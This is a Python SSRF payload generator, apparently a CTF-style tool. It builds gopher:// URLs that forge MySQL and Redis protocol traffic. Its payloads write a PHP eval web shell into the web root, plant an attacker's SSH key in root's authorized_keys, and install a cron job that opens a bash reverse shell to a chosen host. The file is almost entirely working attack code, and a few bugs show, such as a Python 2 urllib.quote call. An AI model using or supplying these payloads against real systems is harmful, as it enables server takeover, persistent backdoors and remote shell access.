import urllib, urllib.parse


class mysqlssrf:
    @staticmethod
    def se(str='') -> str:
        ret = ''
        for i in str:
            ret += '%02x' % ord(i)
        return ret

    @staticmethod
    def sd(str='') -> str:
        ret = ''
        for i in range(0, len(str), 2):
            ret += chr(int(str[i:i + 2], 16))
        return ret

    @staticmethod
    def MySQL(query="select '<?php eval($_POST[cmd])?>' into outfile '/var/www/html/shell.php'", URLenc=False,
              user='root', server='127.0.0.1:3306'):
        encode_user = mysqlssrf.se(user)
        user_length = len(user)
        temp = user_length - 4
        length = mysqlssrf.se(chr(0xa3 + temp))
        dump = length + "00000185a6ff0100000001210000000000000000000000000000000000000000000000"
        dump += encode_user
        dump += "00006d7973716c5f6e61746976655f70617373776f72640066035f6f73054c696e75780c5f636c69656e745f6e616d65086c"
        dump += "69626d7973716c045f7069640532373235350f5f636c69656e745f76657273696f6e06352e372e3232095f706c6174666f726d"
        dump += "067838365f36340c70726f6772616d5f6e616d65056d7973716c"
        auth = dump.replace("\n", "")

        def encode(s):
            a = [s[i:i + 2] for i in range(0, len(s), 2)]
            pla = '%' + "%".join(a);
            plb = ''
            if URLenc:
                for i in pla:
                    plb += '%' + '%02x' % (ord(i))
            else:
                plb = pla

            return "gopher://" + server + "/_" + plb

        def get_payload(query):
            if (query.strip() != ''):
                query = mysqlssrf.se(query)
                query_length = '{:06x}'.format((int((len(query) / 2) + 1)))
                query_length = mysqlssrf.se(mysqlssrf.sd(query_length)[::-1])
                pay1 = query_length + "0003" + query
                final = encode(auth + pay1 + "0100000001")
                return final
            else:
                return encode(auth)

        pl = get_payload(query)
        print('- ' * 40)
        print('Query:', query)
        print('Server:', server)
        print('user:', user)
        print('PS:', '_后面的部分需再次Url编码')
        print('- ' * 40)
        print(pl)
        return pl


class redisssrf:
    @staticmethod
    def redis_format(arr):
        CRLF = "\r\n"
        redis_arr = arr.split(" ")
        cmd = ""
        cmd += "*" + str(len(redis_arr))
        for x in redis_arr:
            cmd += CRLF + "$" + str(len((x.replace("${IFS}", " ")))) + CRLF + x.replace("${IFS}", " ")
        cmd += CRLF
        return cmd

    @staticmethod
    def webShell(ip="192.168.163.128", port="6379",
                 shell="\n\n<?php eval($_GET[\"cmd\"]);?>\n\n",
                 filename="shell.php",
                 path="/var/www/html",
                 passwd="",
                 protocol="gopher://",
                 cmd=[]
                 ):
        if len(cmd) < 1:
            cmd = ["flushall",
                   "set 1 {}".format(shell.replace(" ", "${IFS}")),
                   "config set dir {}".format(path),
                   "config set dbfilename {}".format(filename),
                   "save"
                   ]
        if passwd:
            cmd.insert(0, "AUTH {}".format(passwd))
        payload = protocol + ip + ":" + port + "/_"
        for x in cmd:
            payload += urllib.parse.quote(redisssrf.redis_format(x))
        print('- ' * 40)
        print('ip:', ip)
        print('port:', port)
        print('shell:', shell)
        print('cmd:', cmd)
        print('PS:', '_后面的部分需再次Url编码')

        print('- ' * 40)
        print(payload)
        return payload

    @staticmethod
    def wPubkey(ip="192.168.163.128", port="6379",
                filename="authorized_keys",
                ssh_pub="\n\nssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQDGd9qrfBQqsml+aGC/PoXsKGFhW3sucZ81fiESpJ+HSk1ILv+mhmU2QNcopiPiTu+kGqJYjIanrQEFbtL+NiWaAHahSO3cgPYXpQ+lW0FQwStEHyDzYOM3Jq6VMy8PSPqkoIBWc7Gsu6541NhdltPGH202M7PfA6fXyPR/BSq30ixoAT1vKKYMp8+8/eyeJzDSr0iSplzhKPkQBYquoiyIs70CTp7HjNwsE2lKf4WV8XpJm7DHSnnnu+1kqJMw0F/3NqhrxYK8KpPzpfQNpkAhKCozhOwH2OdNuypyrXPf3px06utkTp6jvx3ESRfJ89jmuM9y4WozM3dylOwMWjal root@kali\n\n",
                path='/root/.ssh/',
                protocol='gopher://',
                cmd=[]
                ):
        if len(cmd) < 1:
            cmd = ["flushall",
                   "set 1 {}".format(ssh_pub.replace(" ", "${IFS}")),
                   "config set dir {}".format(path),
                   "config set dbfilename {}".format(filename),
                   "save"
                   ]
        payload = protocol + ip + ":" + port + "/_"
        for x in cmd:
            payload += urllib.quote(redisssrf.redis_format(x))
        return payload

    @staticmethod
    def rejShell(self, ip="192.168.163.128", port="6379",
                 reverse_ip="127.0.0.1",
                 reverse_port='9999',
                 path="/var/spool/cron",
                 protocol='gopher://',
                 filename="root",
                 cmd=[]
                 ):
        cron = "\n\n\n\n*/1 * * * * bash -i >& /dev/tcp/%s/%s 0>&1\n\n\n\n" % (reverse_ip, reverse_port)

        if len(cmd) < 1:
            cmd = ["flushall",
                   "set 1 {}".format(cron.replace(" ", "${IFS}")),
                   "config set dir {}".format(path),
                   "config set dbfilename {}".format(filename),
                   "save"
                   ]
        payload = protocol + ip + ":" + port + "/_"
        for x in cmd:
            payload += urllib.parse.quote(redisssrf.redis_format(x))
        print('- ' * 40)
        print('target:', ip + ':' + port)
        print('source:', reverse_ip + ':' + reverse_port)
        print('path:', path)
        print('filename:', filename)
        print('PS:', '_后面的部分需再次Url编码')
        print('- ' * 40)
        print(payload)
        return payload
